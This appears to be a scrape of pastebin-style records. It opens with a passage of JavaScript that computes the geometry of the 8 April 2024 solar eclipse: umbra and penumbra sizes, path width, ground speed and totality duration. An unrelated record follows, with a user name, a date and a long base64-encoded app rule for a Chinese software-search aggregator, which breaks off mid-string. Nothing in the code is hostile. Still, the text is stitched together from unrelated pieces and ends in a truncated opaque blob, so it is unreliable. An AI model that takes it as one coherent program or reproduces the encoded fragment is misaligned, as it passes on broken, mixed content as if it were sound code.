	dir = rotVecX(dir, azimuth)

	const [ lat, lon ] = GC.vecToGP(subVec(sunVec, moonVec));

	origin = rotVecY(origin, lat);
	dir = rotVecY(dir, lat);

	origin = rotVecZ(origin, -lon);
	dir = rotVecZ(dir, -lon);

	origin = sumVec(origin, moonVec);

	return { origin, dir };
};

const getShadowEdgeCoord = (moonVec, sunVec, azimuth, calcAngle) => {
	return GC.vecToGP(
		rayEarthIntersection(
			buildShadowEdgeRay(moonVec, sunVec, azimuth, calcAngle),
		),
	);
};

const calcShadowSize = (moonVec, sunVec, azimuth, calcAngle) => {
	const az1 = azimuth;
	const az2 = (azimuth + PI) % TAU;
	const a = getShadowEdgeCoord(moonVec, sunVec, az1, calcAngle);
	const b = getShadowEdgeCoord(moonVec, sunVec, az2, calcAngle);
	return GC.calcDistance(a, b);
};

const calcVecs = (time) => {
	const moonVec = getMoonVec(time);
	const [ sunGHA, sunDec ] = getSunGhaDec(time);
	const sunGP = [ sunDec, ghaToLon(sunGHA) ];
	const sunDist = getSunDist(time);
	const sunVec = ghaDecDistToVec(sunGHA, sunDec, sunDist);
	const locVec = rayEarthIntersection(getCenterShadowRay(moonVec, sunVec));
	const loc = GC.vecToGP(locVec);
	return { sunGP, moonVec, sunVec, loc, locVec };
};

const hasTotality = (locVec, time) => {
	const { sunVec, moonVec } = calcVecs(time);
	const moonAngRad = calcAngularRadius(locVec, moonVec, moonRadius);
	const sunAngRad = calcAngularRadius(locVec, sunVec, sunRadius);
	const sunDir = normalizeVec(subVec(sunVec, locVec));
	const moonDir = normalizeVec(subVec(moonVec, locVec));
	const prod = dotProd(moonDir, sunDir);
	if (prod >= 1) {
		return true;
	}
	const angDist = acos(dotProd(moonDir, sunDir));
	const gap = moonAngRad - sunAngRad;
	return angDist <= gap;
};

const calcAngularRadius = (locVec, bodyVec, bodyRad) => {
	const dist = vecLen(subVec(locVec, bodyVec));
	return asin(bodyRad/dist);
};

const findTotalityEdgeAt = (locVec, startTime, endTime) => {
	let at = startTime;
	let av = hasTotality(locVec, at);
	let bt = endTime;
	let bv = hasTotality(locVec, bt);
	if (av === bv) {
		return null;
	}
	while (bt - at > 1) {
		const mt = (at + bt)/2;
		const mv = hasTotality(locVec, mt);
		if (mv === av) {
			at = mt;
			av = mv;
		} else {
			bt = mt;
			bv = mv;
		}
	}
	return (at + bt)/2;
};

// -------------------------------------------------------------------------- //
// MAIN --------------------------------------------------------------------- //
// -------------------------------------------------------------------------- //

addAlmanacData(`
	Date: 2024-04-08
	# Hour | Sun GHA    | Sun Dec  | Moon GHA   | Moon Dec | Moon HP
	#------|------------|----------|------------|----------|---------
	  18   |  89° 35.5' | 7° 35.2' |  89° 54.4' | 7° 48.9' | 60.9'
	  19   | 104° 35.6' | 7° 36.2' | 104° 23.2' | 8° 06.3' | 60.9'
`);

const peakTime = findGHAMeridianMatch();
const { sunGP, moonVec, sunVec, loc, locVec } = calcVecs(peakTime);
const [ lat, lon ] = loc;
const umbraSizeNS = calcShadowSize(moonVec, sunVec,   0, calcUmbraAngle);
const umbraSizeEW = calcShadowSize(moonVec, sunVec, D90, calcUmbraAngle);
const penumbraSizeNS = calcShadowSize(moonVec, sunVec,   0, calcPenumbraAngle);
const penumbraSizeEW = calcShadowSize(moonVec, sunVec, D90, calcPenumbraAngle);
const sunAlt = D90 - GC.calcAngle(sunGP, loc);

const dtTime = 1 * SEC;
const nextTime = peakTime + dtTime;
const nextLoc = calcVecs(nextTime).loc;
const dtDist = GC.calcDistance(loc, nextLoc);
const speed = dtDist/dtTime;
const dir = GC.calcAzimuth(loc, nextLoc);
const pathWidth = calcShadowSize(moonVec, sunVec, dir + D90, calcUmbraAngle);
const startTime = findTotalityEdgeAt(locVec, table[0].time, peakTime);
const endTime = findTotalityEdgeAt(locVec, peakTime, table.at(-1).time);
const duration = endTime - startTime;
const sunAngRad = calcAngularRadius(locVec, sunVec, sunRadius);
const moonAngRad = calcAngularRadius(locVec, moonVec, moonRadius);

console.log(' 1. Latitude:', strAngle(lat, 'N ', 'S '));
console.log(' 2. Longitude:', strAngle(lon, 'E ', 'W '));
console.log(' 3. Time:', strTime(peakTime));
console.log(' 4. Sun Alt.:', strAngle(sunAlt));
console.log(' 5. Moon:Sun ratio:', (moonAngRad/sunAngRad).toFixed(4));
console.log(' 6. Umbra E-W size:', strDist(umbraSizeEW));
console.log(' 7. Umbra N-S size:', strDist(umbraSizeNS));
console.log(' 8. Path angle:', strAngle(dir));
console.log(' 9. Path width:', strDist(pathWidth));
console.log('10. Ground speed:', strSpeed(speed));
console.log('11. Duration:', strDuration(duration));
console.log('12. Penumbra E-W size:', strDist(penumbraSizeEW));
console.log('12. Penumbra N-S size:', strDist(penumbraSizeNS));"
mDcPThyY,邀您一起看：🔥i3综合社区🔥,xiaomianao666,JavaScript,Saturday 13th of April 2024 12:41:07 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥🔥i3综合社区🔥@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6jOe6p+ino+aekFwiLFwicGF0aFwiOlwicFwiLFwicnVsZVwiOlwianM6XFxudmFyIGQgPSBbXTtcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgdXJsOiB1cmwsXFxuICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICBkZXNjOiBcXFwiZmxvYXQmJjEwMCVcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIGNhbkJhY2s6IHRydWVcXG4gICAgfVxcbn0pO1xcbnNldFJlc3VsdChkKTtcIn0se1wiY29sX3R5cGVcIjpcInRleHRfMVwiLFwibmFtZVwiOlwi5pCc57Si5rWL6K+VXCIsXCJwYXRoXCI6XCJzXCIsXCJydWxlXCI6XCJqczpcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXCJ1XFxcIikpO1xcbmxvZyh1cmwpO1xcbmxldCBrZXkgPSBnZXRQYXJhbShcXFwia2V5XFxcIik7XFxubGV0IHNwID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2Uvc3BcXFwiKTtcXG5zZXRSZXN1bHQoc3AodXJsLCBrZXksIFxcXCLmkJzntKLmtYvor5VcXFwiKSk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLogZrlkIjmkJzntKJcIixcInBhdGhcIjpcInByb1wiLFwicnVsZVwiOlwidmFyIGQgPSBbXTtcXG5pZiAoTVlfUEFHRSA9PSAxKSB7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuaQnOe0olxcXCIsXFxuICAgICAgICB1cmw6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgIH0pLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJpbnB1dFxcXCIsXFxuICAgICAgICBkZXNjOiBcXFwi6K+36L6T5YWl5YWz6ZSu6K+N77yM5bC96YeP5bCR5a2X5LiN6KaB5aSa5a2XXFxcIixcXG4gICAgICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKFxcXCJzb3VcXFwiLCBcXFwiXFxcIiksXFxuICAgICAgICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwic291XFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgIH0pXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBhZGRMaXN0ZW5lcihcXFwib25DbG9zZVxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgY2xlYXJNeVZhcihcXFwic291XFxcIik7XFxuICAgICAgICBjbGVhck15VmFyKFxcXCJzb1xcXCIpO1xcbiAgICB9KSk7XFxufVxcblxcbmxldCBzID0gZ2V0TXlWYXIoXFxcInNvdVxcXCIsIFxcXCJcXFwiKTtcXG5sZXQgciA9IFxcXCJcXFwiO1xcbmlmIChzICE9IFxcXCJcXFwiKSB7XFxuICAgIGxldCBwID0gTVlfUEFHRTtcXG4gICAgbGV0IHtcXG4gICAgICAgIGxvYWRcXG4gICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFwiKTtcXG4gICAgbGV0IHtcXG4gICAgICAgIHdyYXBcXG4gICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3Rvb2xcXFwiKTtcXG4gICAgbGV0IGRhdGEgPSBsb2FkKHAsIHIgIT0gXFxcIlxcXCIgPyByIDogbnVsbCk7XFxuXFxuICAgIGxldCBwYWdlaWQgPSBNWV9SVUxFLnRpdGxlICsgXFxcIi1wYWdlXFxcIiArIHA7XFxuICAgIGlmIChkYXRhLmxlbmd0aCA+IDApIHtcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLliqDovb3nrKxcXFwiICsgcCArIFxcXCLpobXkuK3vvIzov5vluqbvvJoxL1xcXCIgKyBkYXRhLmxlbmd0aCxcXG4gICAgICAgICAgICB1cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICAgICAgZGVzYzogXFxcIlxcXCIsXFxuICAgICAgICAgICAgcGljX3VybDogXFxcIlxcXCIsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IHBhZ2VpZFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICB9XFxuICAgIHNldFJlc3VsdChkKTtcXG4gICAgbG9nKGRhdGEubGVuZ3RoKTtcXG4gICAgaWYgKGRhdGEubGVuZ3RoID4gMCkge1xcbiAgICAgICAgLy/lpJrnur/nqIvliqDovb0gICAgICAgIFxcbiAgICAgICAgbGV0IHJlYWxQYWdlID0gXFxcIlxcXCIgPT0gciA/IDEgOiBwO1xcbiAgICAgICAgbGV0IHRhc2tzID0gZGF0YS5tYXAoaXQgPT4ge1xcbiAgICAgICAgICAgIHJldHVybiB7XFxuICAgICAgICAgICAgICAgIGZ1bmM6IGZ1bmN0aW9uKHJ1bGUpIHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBydWxlLmZpbmQocywgcmVhbFBhZ2UpO1xcbiAgICAgICAgICAgICAgICB9LFxcbiAgICAgICAgICAgICAgICBwYXJhbTogaXQsXFxuICAgICAgICAgICAgICAgIGlkOiBcXFwicnVsZUBcXFwiICsgaXQubmFtZVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcblxcbiAgICAgICAgYmF0Y2hFeGVjdXRlKHRhc2tzLCB7XFxuICAgICAgICAgICAgZnVuYzogZnVuY3Rpb24ocGFyYW0sIGlkLCBlcnJvciwgcmVzdWx0KSB7XFxuICAgICAgICAgICAgICAgIC8vbG9nKFxcXCJsaXN0ZW5lcjogXFxcIiArIChyZXN1bHQgfHwgW10pLmxlbmd0aClcXG4gICAgICAgICAgICAgICAgcGFyYW0uaSA9IHBhcmFtLmkgKyAxO1xcbiAgICAgICAgICAgICAgICBpZiAocmVzdWx0KSB7XFxuICAgICAgICAgICAgICAgICAgICB0cnkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGl0IG9mIHJlc3VsdCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJhbS5qID0gcGFyYW0uaiArIDE7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFkZEl0ZW1CZWZvcmUocGFnZWlkLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogd3JhcChpdC50aXRsZSwgcyksXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBpdC5kZXNjLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBpdC51cmwsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBpdC5waWNfdXJsLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IGl0LnBpY191cmwgPyAnbW92aWVfMV92ZXJ0aWNhbF9waWMnIDogXFxcInRleHRfMVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRyYTogaXQuZXh0cmFcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7fVxcblxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlmIChwYXJhbS5pID49IHBhcmFtLmFsbCkge1xcbiAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbShwYWdlaWQpXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuWKoOi9veesrFxcXCIgKyBNWV9QQUdFICsgXFxcIumhteS4re+8jOi/m+W6pu+8mlxcXCIgKyAocGFyYW0uaSArIDEpICsgXFxcIi9cXFwiICsgcGFyYW0uYWxsLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcIlxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogcGFnZWlkXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgcGFyYW06IHtcXG4gICAgICAgICAgICAgICAgYWxsOiBkYXRhLmxlbmd0aCxcXG4gICAgICAgICAgICAgICAgaTogMCxcXG4gICAgICAgICAgICAgICAgajogLTFcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9KVxcbiAgICB9XFxufSBlbHNlIHtcXG4gICAgbGV0IHtcXG4gICAgICAgIGxvYWRcXG4gICAgfSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFwiKTtcXG4gICAgbGV0IGRhdGEgPSBsb2FkKC0xLCBudWxsKTtcXG4gICAgaWYgKGRhdGEubGVuZ3RoID4gMCkgeyAgICAgICBcXG4gICAgICAgICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL21hbmFnZVxcXCIpKGQsIGRhdGEubWFwKGl0ID0+IGl0Lm5hbWUpKTtcXG4gICAgICAgIGZvciAobGV0IGl0IG9mIGRhdGEpIHtcXG4gICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogaXQubmFtZSxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFwic2VsZWN0Oi8vXFxcIiArIEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi6K+36YCJ5oup5pON5L2cXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGNvbDogMSxcXG4gICAgICAgICAgICAgICAgICAgIG9wdGlvbnM6IFtcXFwi6K6/6Zeu6aaW6aG1XFxcIiwgXFxcIuaQnOe0ouatpOermVxcXCJdLFxcbiAgICAgICAgICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKHVybCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpbnB1dCA9PSBcXFwi6K6/6Zeu6aaW6aG1XFxcIikge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBNWV9VUkwgPSB1cmw7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwieDU6Ly9cXFwiICsgZ2V0SG9tZSh1cmwpXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2Uvc2luZ2xlc1xcXCJcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICB9LCBpdC51cmwpXFxuICAgICAgICAgICAgICAgIH0pLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImZsZXhfYnV0dG9uXFxcIixcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcIlxcXCIsXFxuICAgICAgICAgICAgICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgUlVMRToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWU6IGl0Lm5hbWUsXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBpdC51cmxcXG4gICAgICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgICAgICBsb25nQ2xpY2s6IFt7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLnpoHnlKhcXFwiICsgaXQubmFtZSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygobmFtZSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5rip6aao5o+Q56S6XFxcIixcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IFxcXCLnoa7orqTliKDpmaTnpoHnlKhcXFwiICsgbmFtZSArIFxcXCLlkJfvvJ9cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmlybTogJC50b1N0cmluZygobmFtZSwgcnVsZSkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlbW92ZVJ1bGVcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvZGF0YT9ydWxlPVxcXCIgKyBydWxlKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZW1vdmVSdWxlKG5hbWUpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL09LXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIG5hbWUsIE1ZX1JVTEUudGl0bGUpXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCI7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfSwgaXQubmFtZSlcXG4gICAgICAgICAgICAgICAgICAgIH0sIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIuiuv+mXrummlumhtVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICAgICAganM6IFxcXCIneDU6Ly9cXFwiICsgZ2V0SG9tZShpdC51cmwpICsgXFxcIidcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9LCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLmkJzntKLmraTmupBcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGpzOiBcXFwiJ2hpa2VyOi8vcGFnZS9zaW5nbGVzJ1xcXCJcXG4gICAgICAgICAgICAgICAgICAgIH1dXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0gICAgICAgXFxuICAgIH1cXG59XFxuXFxuc2V0UmVzdWx0KGQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5pWw5o2uXCIsXCJwYXRoXCI6XCJkYXRhXCIsXCJydWxlXCI6XCIvL+W5tuWPkeinhOWImeaVsFxcbmxldCBzaXplMCA9IDEwO1xcbmxldCBydWxlc1RleHQwID0gYPCflKU0MjNEb3du8J+UpUBodHRwczovL3d3dy40MjNkb3duLmNvbS9zZWFyY2gvKipcXG7wn5Sl5p6c5qC45Yml5aOz8J+UpUBodHRwczovL3d3dy5naHhpLmNvbS8/cz0qKlxcbvCflKXlha3pn7Pova/ku7bwn5SlQGh0dHBzOi8vd3d3LjZ5aXQuY29tLz9zPSoqXFxu8J+UpeW/g+a1t0Xnq5nwn5SlQGh0dHBzOi8vYXBwaG90LmNjLz9zPSoqXFxu8J+UpeWkp+ecvOS7lPCflKVAaHR0cDovL3d3dy5kYXlhbnphaS5tZS8/cz0qKlxcbvCflKXpo5jpgaXwn5SlQGh0dHBzOi8vd3d3Lm1weWl0LmNvbS8/cz0qKlxcbvCflKXlvILmmJ/nqbrpl7Twn5SlQGh0dHBzOi8vd3d3Lnl4c3NwLmNvbS8/cz0qKlxcbvCflKXokL3lsJjkuYvmnKjwn5SlQGh0dHBzOi8vd3d3Lmx1b2NoZW56aGltdS5jb20vP3M9KipcXG7wn5Sl57u/6Imy6LWE5rqQ8J+UpUBodHRwczovL3d3dy53ZWlkaWFubWlzaHUuY29tL3NlYXJjaC8qKi9cXG7wn5Sl5LmQ6L2v5Y2a5a6i8J+UpUBodHRwczovL3d3dy5pc2hhcmVwYy5jb20vP3M9KipcXG7wn5Sl57O757uf6L+38J+UpUBodHRwczovL3d3dy54aXRtaS5jb20vP3M9KipcXG7wn5SlWkFQUk/mnYLotKfpk7rwn5SlQGh0dHBzOi8vdG1pb2UuY29tLz9zPSoqXFxu8J+UpeS6v+egtOWnkPCflKVAaHR0cHM6Ly93d3cueXBvamllLmNvbS8/cz0qKlxcbvCflKXmnoHlrqLkuIvovb3wn5SlQGh0dHBzOi8vd3d3LmdlZWtkbG9hZC5jb20vP3M9KipcXG7wn5Sl5bCP56qd8J+UpUBodHRwczovL3d3dy5uaXRlMDcuY29tLz9yZWY9YWR6aHAudmlwXFxu8J+Upeaeq+mfs+W6lOeUqPCflKVAaHR0cHM6Ly93d3cuZnk2Yi5jb20vP3M9KipcXG7wn5Sl56We5Zmo5aa58J+UpUBodHRwczovL3RzcTM2MC5jb20vP3M9KipcXG7wn5Sl6bih55uS8J+UpUBodHRwczovL2Nhb25pYW5nLm5ldC9zZWFyY2gvKiouaHRtbFxcbvCflKXlt6fmioDwn5SlQGh0dHBzOi8vd3d3LnFpYW9qaTguY29tLz9zPSoqXFxu8J+Upei9r+S7tueOi/CflKVAaHR0cHM6Ly9mcmVlLnNvZnRraW5nLmNvbS50dy9xdWVyeS9cXG7wn5Sl5ZOH5ZaU5ZCb8J+UpUBodHRwczovL3d3dy53YW9kb3duLmNvbS9zZWFyY2gvKipcXG7wn5Sl5pyo6aOO6L2v5Lu28J+UpUBodHRwczovL3d3dy5tZnJqei5jb20vP3M9KipcXG7wn5Sl6Zi/6YW35p2C6LSn8J+UpUBodHRwczovL3d3dy5jb29sZXhlLmNvbS8/cz0qKiZ0eXBlPXBvc3RcXG7wn5Sl6JOd6bKo8J+UpUBodHRwczovL3d3dy5sYW4tc2hhLmNvbS8/cz0qKlxcbvCflKXlj5Hng6flj4vnu7/ova/wn5SlQGh0dHBzOi8vZnN5bHIuY29tLz9zPSoqXFxu8J+UpeWuieWNk+W6lOeUqPCflKVAaHR0cHM6Ly93d3cuaTN6aC5jb20vP3M9KipcXG7wn5Sl5YiG5Lqr6ICF8J+UpUBodHRwczovL3d3dy5zaGFyZXJ3LmNvbS9zZWFyY2gucGhwP3E9KipcXG7wn5Sl6LWE5rqQ5YiG5Lqr77yI6ZyA55m75b2V77yJ8J+UpUBodHRwczovL3d3dy55dW5wYW56aXl1YW4uY29tL2ZvbnRzZWFyY2guaHRtP2ZvbnRuYW1lPSoqXFxu8J+UpeW3heWzsOiuuuWdm++8iOmcgOeZu+W9le+8ifCflKVAaHR0cHM6Ly93d3cucGVha3dvLmNvbS9zZWFyY2gucGhwP21vZD1mb3J1bSZzZWFyY2hpZD0zNiZvcmRlcmJ5PWxhc3Rwb3N0JmFzY2Rlc2M9ZGVzYyZzZWFyY2hzdWJtaXQ9eWVzJmt3PSoqJm1vYmlsZT0yXFxu8J+UpeaXoOS4reWSjPCflKVAaHR0cHM6Ly93emhvbmdoZS5jb20vP3M9KipcXG7wn5Sl5bCP6auY5pWZ5a2m8J+UpUBodHRwczovL3d3dy5ndzU0LmNvbS9pbmRleC5waHA/a2V5d29yZD0qKlxcbvCflKXotYTmupDlkKbwn5SlQGh0dHBzOi8vd3d3Lnp5Zm91LmNvbS8/cz0qKlxcbvCflKXopb/nk5zop4bpopHwn5SlQGh0dHBzOi8vc28uaXhpZ3VhLmNvbS9zLyoqYXBwKipcXG7wn5SlSVRN6LWE5rqQ8J+UpUBodHRwczovL3BpYy5pdG1yZXNvdXJjZXMuY29tLz9zPSoqJnBvc3RfdHlwZT1wb3N0XFxu8J+UpeaXoOeXleWTpfCflKVAaHR0cHM6Ly93d3cud2hnNi5jb20vNDY1OC5odG1sXFxu8J+UpeWQvuWQjei9r+S7tuW6k/CflKVAaHR0cHM6Ly93d3cuNW1rdS5jb20vaW5kZXgucGhwP2tleXdvcmQ9KiomdHlwZWlkPTBcXG7wn5Sl5LiA5Y+36LWE5rqQ8J+UpUBodHRwczovL3lpaGFvenkuY29tL3NlYXJjaC8qKi5odG1sXFxu8J+UpVFR55qH5peP6aaG8J+UpUBodHRwczovL3d3dy5xcWh6Zy5jb20vaW5kZXgucGhwP2tleXdvcmQ9KiomdHlwZWlkPTBcXG7wn5Sl55qu6YOo6LWE5rqQ572R8J+UpUBodHRwczovL3d3dy5waWJ1ZS5jb20vaW5kZXgucGhwP2tleXdvcmQ9KiomdHlwZWlkPTBcXG7wn5Sl5pS26ZuG572R8J+UpUBodHRwczovL3d3dy5pc3Nqdy5jb20vP3M9KipcXG7wn5Sl6L275Yib56S+5Yy68J+UpUBodHRwczovLzdjYzdjYy5jb20vc2VhcmNoLV9FNl85Ml9BRF9FNl85NF9CRV9FNV85OV9BOC0xLmh0bVxcbvCflKXlsI/nmb3otYTmupDnvZHvvIjpnIDnmbvlvZXvvInwn5SlQGh0dHBzOi8vd3d3LnhpYW9iYWljYWkuZnVuLz9zPSoqXFxu8J+UpeatpeWFlOWIhuS6q/CflKVAaHR0cHM6Ly9idXRxcS5jb20vP3M9KiomdHlwZT1wb3N0XFxu8J+UpeenkeaKgOmaj+mjjvCflKVAaHR0cHM6Ly93d3cuNTJuZncuY24vP3M9KiomdHlwZT1wb3N0XFxu8J+UpeWbm+S4quepuuagvPCflKVAaHR0cHM6Ly93d3cuNHNwYWNlcy5vcmcvP3M9KipcXG7wn5Sl546J57Gz57KS8J+UpUBodHRwczovL3lpbWlsaS5uZXQvP3M9KipcXG7wn5Sl5LiN5q276bif8J+UpUBodHRwczovL2l1aS5zdS9zZWFyY2gvKiovXFxu8J+UpeWIhuS6q+i/t/CflKVAaHR0cHM6Ly93d3cuZmVueG0uY29tL3NlYXJjaC5waHA/cT0qKlxcbvCflKVhaGhoZnPwn5SlQGh0dHBzOi8vd3d3LmFoaGhoZnMuY29tLz9jYXQ9JnM9KipcXG7wn5SlQXBw5Za18J+UpUBodHRwczovL3d3dy5hcHBtaXUuY29tLz9zPSoqJnR5cGU9cG9zdFxcbvCflKVpM+e7vOWQiOekvuWMuvCflKVAaHR0cHM6Ly93d3cuaTN6aC5jb20vP3M9KipcXG7wn5Sl5YW25LmQ5Y2a6K6w8J+UpUBodHRwczovL3d3dy5xaWxlYmIuY29tLz9zPSoqXFxu8J+UpeiKiuiKiueyvuWFuPCflKVAaHR0cHM6Ly9teXFxamQuY29tLz9zPSoqXFxu8J+Upeiwt+WtkOeMq+mDqOiQveagvPCflKVAaHR0cDovL3d3dy54Z2l1LmNvbS9pbmRleC5waHA/a2V5d29yZD0qKlxcb